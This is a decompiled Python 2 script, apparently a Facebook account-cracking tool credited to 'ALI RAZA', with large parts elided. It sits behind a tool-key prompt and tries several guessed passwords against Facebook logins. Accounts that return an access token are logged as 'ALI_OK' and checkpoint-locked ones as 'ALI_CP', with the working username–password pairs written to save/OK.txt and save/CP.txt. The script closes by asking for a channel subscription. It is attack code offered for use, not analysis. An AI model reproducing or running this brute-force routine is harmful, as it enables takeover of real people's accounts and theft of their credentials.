...
# uncompyle6 version 
# Original written By ALI RAZA


import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
__author__ = 'ALI'
__copyright = 'All rights reserved . Copyright  ALI RAZA'
CorrectUsername = 'ALI'
os.system('clear')
loop = 'true'
while (loop == 'true'):
    username = raw_input('\033[1;91mENTER TOOL KEY…………=>> ALI:\033[1;93m ')
...
def action():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[92m  [ALI_OK]  ' + k + c + user + '  |  ' + pass1
                okb = open('save/CP.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m  [ALI_CP] ' + k + c + user + '  |  ' + pass1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m  [ALI_OK] ' + k + c + user + '  |  ' + pass2
                    okb = open('save/OK.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;91m  [ALI_CP] ' + k + c + user + '  |  ' + pass2
                    cps = open('save/CP.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m  [ALI_OK]  ' + k + c + user + '  |  ' + pass3
                        okb = open('save/CP.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;91m  [ALI_CP] ' + k + c + user + '  |  ' + pass3
                        cps = open('save/CP.txt', 'a')
    ...
    jalan('Channel zror subscribe krna')
    raw_input('\n\x1b[1;95m[\x1b[1;98mALI_menu_Back\x1b[1;95m]')
    login()
